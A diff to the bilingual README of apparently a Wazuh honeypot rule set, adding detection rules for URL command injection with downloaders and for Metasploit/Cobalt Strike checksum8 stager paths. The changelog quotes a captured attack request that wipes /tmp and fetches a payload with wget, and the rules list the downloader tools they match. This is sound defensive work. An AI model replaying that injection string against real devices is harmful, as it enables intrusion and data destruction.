@@ -34,7 +34,7 @@ Manager side: copy the rule files to `/var/ossec/etc/rules/`, check them with `w
 | File | Rules |
 |---|---|
 | `honeypot_rules.xml` | 100300 to 100320: SSH, shell commands and malware captures |
-| `honeypot_rules_http.xml` | 100340 to 100348: HTTP and FTP |
+| `honeypot_rules_http.xml` | 100340 to 100349, 100380, 100384 and 100385: HTTP and FTP |
 | `honeypot_ioc_rules.xml` | 100330: failed logins from a known attacker IP |
 | `honeypot-attackers.example` | Format of the CDB list that rule 100330 reads |
 | `honeypot_rules_ssh.xml` | 100350 to 100369, 100371 to 100375, 100381 and 100382: how each SSH connection ended, and what the attacker types |
@@ -66,6 +66,8 @@ The name `honeypot_rules_http.xml` is deliberate. Wazuh loads rule files in alph
 | 100348 | 6 | Probe for an AI model API: `/v1/models`, `/v1beta/models`, `/v1/chat/completions`, `/api/tags`, `/ollama/` (T1595.002) |
 | 100349 | 6 | Probe for an MCP (Model Context Protocol) or SSE endpoint: `/mcp`, `/mcp/`, `/sse`, `/api/mcp` (T1595.002) |
 | 100380 | 8 | Netgear router exploit: command injection via `setup.cgi?...todo=syscmd` (T1190) |
+| 100384 | 8 | Command injection with a download in a URL parameter (`cmd`, `command`, `exec`, `shell` carrying `wget`, `curl`, `tftp`...), placed after 100380 so the Netgear exploit keeps matching there (T1190) |
+| 100385 | 5 | Probe of a checksum8 path: `/aaa9`, `/aab8`, `/aab9` (Metasploit and Cobalt Strike stager convention), fixed list (T1595.002) |
 | 100350 | 2 | Any SSH connection (base rule for the connection set, counted but not shown) |
 | 100351 | 3 | Scanner: the connection ended with no SSH banner or with a protocol error (T1595) |
 | 100352 | 6 | The honeypot accepted the login: result `autenticado_sin_shell`, `exec` or `shell` (T1078) |
@@ -215,6 +217,12 @@ A network in CIDR form (`198.51.100.0/24:campaign`) does not work as a key in th
 
 - **100381 and 100382, counting the shell-check burst.** On 17 November one IP (2.57.x.x) ran about 90 shell-check commands across 7 interpreters. 100369 fired once and its `ignore="300"` silenced the rest, so ~90 events landed on the generic 100360, which looked like a detection gap but was not. My first attempt (23 November) added 100381 as a sibling of 100369 and assumed an ignored rule passes the event to the next sibling. **It does not**: on 24 November the manager logged ~20 more shell-check commands from each of two IPs as level-3 100360, none as 100381. When a child rule is inside its `ignore` window, the event stays at its parent. The fix (24 November) uses that: 100381 (level 2, no alert) is now the parent that holds the pattern, and 100369 is its child (`if_sid` 100381) and keeps `ignore="300"`. Ignored commands now stay at 100381, silently. 100382 counts 100381 per IP (`same_field` ip) and alerts at level 7 if one IP sends 40 in 5 minutes. A normal sweep is 35 to 50 commands, the 17 November one about 90, so 40 is a guess to adjust with real data. `wazuh-logtest` does not apply `ignore` (the sample sent 45 times gives 100369 every time), so the two samples are marked `needs=ignore` and `run_logtest.py` skips them unless you pass `--ignore`. Still to confirm with real traffic: that the commands now stay at 100381 and that 100382 fires.
 
+### Rules added on 25 November
+
+- **100384, command injection with a download.** The policy-2 honeypot got `/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://.../Mozi...`. The file name says Mozi, but calling it that botnet is my reading. No rule covered it: 100380 only looks at Netgear's `setup.cgi` and 100341 only at GPON. Instead of one more rule per path, this one looks for a `cmd`, `command`, `exec` or `shell` parameter carrying a downloader. It sits after 100380 on purpose, because among sibling rules the first match wins, so the Netgear exploit still ends on the more specific rule. There is a logtest sample for that ordering. Limit: it reads the URL only, not a POST body.
+- **100385, checksum8 paths.** `/aaa9`, `/aab8` and `/aab9` showed up every day on both honeypots (about 2 IPs each). Their ASCII sum mod 256 is 92 or 93, the convention of Metasploit and Cobalt Strike HTTP stagers. I found no source that ties these exact paths to a named scanner, so "looking for a Cobalt Strike server" is an inference. The list is fixed because a regex cannot compute the sum, so other paths with the same property will not fire it. Level 5, like other known-probe rules.
+- Not turned into a rule on purpose: `/zc?action=getInfo` (Spotify Connect ZeroConf, a device API, harmless for this honeypot) and the proxy-checker traffic, whose recurrence is better read in the daily summary.
+
 ### Rules added on 24 November
 
 - **100383, spread-out credential campaign.** In two days the main honeypot accepted logins from 36 different IPs. About 39 connections carried the client banner `SSH-2.0-OpenSSH_7.4`, which looks copied by a tool. Each IP came back every few days with one credential (names like `operator2017` or `supervisor2021`) and left after 3 to 6 seconds. One IP alone looks harmless, and 100352 reports them one at a time. 100383 counts accepted logins (100352) that share the same `banner`, from any IP: 15 in 24 h raises a level-8 alert. My reading is a campaign that spreads credentials over many IPs, which is an inference, not a conclusion. Limits: it counts events, not distinct IPs (one very insistent IP also adds up, though 100354 already catches it); library banners (`Go`, `libssh`...) end on child 100353 and do not count, on purpose. The 15 is a guess from about 18 per day in the 23-24 November data. Not tested in the manager yet.
@@ -334,7 +342,7 @@ Del lado del manager: copiar los archivos de reglas a `/var/ossec/etc/rules/`, v
 | Archivo | Reglas |
 |---|---|
 | `honeypot_rules.xml` | 100300 a 100320: SSH, comandos de la shell y capturas de malware |
-| `honeypot_rules_http.xml` | 100340 a 100348: HTTP y FTP |
+| `honeypot_rules_http.xml` | 100340 a 100349, 100380, 100384 y 100385: HTTP y FTP |
 | `honeypot_ioc_rules.xml` | 100330: logins fallidos desde una IP de atacante conocida |
 | `honeypot-attackers.example` | Formato de la lista CDB que lee la regla 100330 |
 | `honeypot_rules_ssh.xml` | 100350 a 100369, 100371 a 100375, 100381 y 100382: cómo terminó cada conexión SSH y qué escribe el atacante |
@@ -366,6 +374,8 @@ El nombre `honeypot_rules_http.xml` es a propósito. Wazuh carga los archivos de
 | 100348 | 6 | Sondeo de una API de modelos de IA: `/v1/models`, `/v1beta/models`, `/v1/chat/completions`, `/api/tags`, `/ollama/` (T1595.002) |
 | 100349 | 6 | Sondeo de un endpoint MCP (Model Context Protocol) o SSE: `/mcp`, `/mcp/`, `/sse`, `/api/mcp` (T1595.002) |
 | 100380 | 8 | Exploit de router Netgear: inyeccion de comando via `setup.cgi?...todo=syscmd` (T1190) |
+| 100384 | 8 | Inyección de comando con descarga en un parámetro de la URL (`cmd`, `command`, `exec`, `shell` con `wget`, `curl`, `tftp`...), puesta después de 100380 para que el exploit de Netgear siga cayendo ahí (T1190) |
+| 100385 | 5 | Sondeo de una ruta checksum8: `/aaa9`, `/aab8`, `/aab9` (convención de los stagers de Metasploit y Cobalt Strike), lista fija (T1595.002) |
 | 100350 | 2 | Cualquier conexión SSH (regla base del conjunto de conexiones, se cuenta pero no se muestra) |
 | 100351 | 3 | Scanner: la conexión terminó sin banner SSH o con un error de protocolo (T1595) |
 | 100352 | 6 | El honeypot aceptó el login: resultado `autenticado_sin_shell`, `exec` o `shell` (T1078) |
@@ -514,6 +524,12 @@ Una red en formato CIDR (`198.51.100.0/24:campaign`) no funciona como clave en e
 ### Reglas agregadas el 23 de noviembre
 
 - **100381 y 100382, conteo de la ráfaga de verificación de shell.** El 17 de noviembre una IP (2.57.x.x) corrió unos 90 comandos de verificación de shell con 7 intérpretes. 100369 saltó una vez y su `ignore="300"` silenció el resto, así que ~90 eventos cayeron en la genérica 100360, lo que parecía un hueco de detección pero no lo era. Mi primer intento (23 de noviembre) puso 100381 como hermana de 100369 y asumió que una regla ignorada le pasa el evento a la hermana siguiente. **No es así**: el 24 de noviembre el manager registró unos 20 comandos más de verificación de dos IPs distintas como 100360 de nivel 3, ninguno como 100381. Cuando una regla hija está dentro de su ventana de `ignore`, el evento se queda en su padre. La corrección (24 de noviembre) aprovecha eso: 100381 (nivel 2, sin alerta) pasa a ser el padre que tiene el patrón, y 100369 es su hija (`if_sid` 100381) y conserva `ignore="300"`. Los comandos ignorados ahora se quedan en 100381, en silencio. 100382 cuenta 100381 por IP (`same_field` ip) y alerta en nivel 7 si una IP manda 40 en 5 minutos. Un barrido normal son 35 a 50 comandos, el del 17 de noviembre unos 90, así que 40 es una estimación a ajustar con datos reales. `wazuh-logtest` no aplica `ignore` (la muestra mandada 45 veces da 100369 todas las veces), así que las dos muestras llevan `needs=ignore` y `run_logtest.py` las saltea salvo que le pases `--ignore`. Falta confirmar con tráfico real que los comandos se quedan en 100381 y que 100382 salta.
+
+### Reglas agregadas el 25 de noviembre
+
+- **100384, inyección de comando con descarga.** El honeypot de la política 2 recibió `/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://.../Mozi...`. El nombre del archivo dice Mozi, pero decir que es esa botnet es una lectura mía. Ninguna regla lo cubría: 100380 solo mira el `setup.cgi` de Netgear y 100341 solo GPON. En vez de una regla más por cada ruta, esta busca un parámetro `cmd`, `command`, `exec` o `shell` que lleve un descargador. Va después de 100380 a propósito, porque entre reglas hermanas gana la primera que coincide, así el exploit de Netgear sigue terminando en la más específica. Hay una muestra de logtest para ese orden. Límite: lee solo la URL, no el cuerpo de un POST.
+- **100385, rutas checksum8.** `/aaa9`, `/aab8` y `/aab9` aparecieron todos los días en los dos honeypots (unas 2 IPs cada uno). Su suma ASCII módulo 256 da 92 o 93, la convención de los stagers HTTP de Metasploit y Cobalt Strike. No encontré ninguna fuente que ate estas rutas exactas a un escáner con nombre, así que "buscan un servidor de Cobalt Strike" es una inferencia. La lista es fija porque una regex no puede calcular la suma, así que otras rutas con la misma propiedad no la disparan. Nivel 5, como otras reglas de sondeo conocido.
+- No hice regla, a propósito, de `/zc?action=getInfo` (Spotify Connect ZeroConf, una API de dispositivos, inofensiva para este honeypot) ni del tráfico de verificadores de proxy, cuya recurrencia se lee mejor en el resumen diario.
 
 ### Reglas agregadas el 24 de noviembre
 
